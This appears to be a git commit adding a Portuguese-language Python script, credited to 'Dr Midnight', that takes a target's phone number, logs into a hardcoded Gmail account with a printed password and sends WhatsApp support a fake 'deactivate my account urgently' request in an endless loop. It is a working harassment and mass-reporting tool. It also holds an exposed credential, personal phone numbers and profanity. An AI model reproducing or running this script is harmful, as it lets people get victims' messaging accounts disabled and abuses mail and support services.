e6fcbb574d65c80fdd9c80e992d275b5dd85094a
Dr Midnight <79802337+drmidnightytb@users.noreply.github.com>
2021-07-02 18:20:41 -0300

    Create main.py

---
+++ main.py
@@ -0,0 +1,98 @@
+import smtplib
+from time import sleep
+
+print('''
+
+
+
+''')
+x1 = str(input('\033[1;4;36mDigite a Senha:\033[m ')).strip()
+print('')
+if x1 == 'midspam':
+    sleep(2)
+    print('\033[1;4;32mSenha Correta!\033[m')
+    sleep(.5)
+    print('\033[1;4;33mAGUARDE...\033[m\n')
+    sleep(3)
+    print('\033[1;4;34m========================================')
+    sleep(.5)
+    print("///////\033[1;4;34m> SCRIPT DE DESATIVAÇÃO AQUI <///\033[m")
+    sleep(1)
+    print('\033[1;4;34m////////> TOOL BY DR MIDNIGHT </////////\033[m')
+    sleep(.5)
+    print('\033[1;4;34m========================================\033[m\n')
+    sleep(.5)
+    send = 'print.py3@gmail.com'
+    rec = 'support@support.whatsapp.com'
+    print('\033[1;4;34mExemplo: \033[1;4;33m+55 69 12345-6789')
+    number = input('\033[1;4;36mNúmero para atacar:\033[m ').strip()
+    sleep(.5)
+    msg = 'Desative minha conta urgentemente: {}'.format(number)
+    print('')
+    if "+55 12 99163-9423" in number:
+        print('\033[1;4;31mVAI SE FODER = ESSA PUTA NÃO >:(')
+        exit()
+    if "+55 12 98878-9266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "+55 12 988789266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "55 12 988789266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "55 12 98878-9266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "+551298878-9266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "+5512988789266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "5512988789266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "551298878-9266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+
+    if "+55 12 8878-9266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "+55 12 88789266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "55 12 88789266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "55 12 8878-9266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "+55128878-9266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "+551288789266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "551288789266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    if "55128878-9266" in number:
+        print('\033[1;4;31mVAI SE FODER = MEU DONO NÃO >:(')
+        exit()
+    print('\033[1;4;34mA senha que pede abaixo é \033[1;4;33m"LEVEL1983"')
+
+    password = input('\033[1;4;36mSenha:\033[m ')
+
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+
+    server.ehlo()
+    server.starttls()
+    server.login(send, password)
+    while True:
+        print(f'\n\033[1;32mENVIANDO DENÚNCIAS!')
+        server.sendmail(send, rec, msg)
+else:
+    sleep(2)
+    print('\033[1;4;31mSenha Incorreta... Get the Fuck Out!')
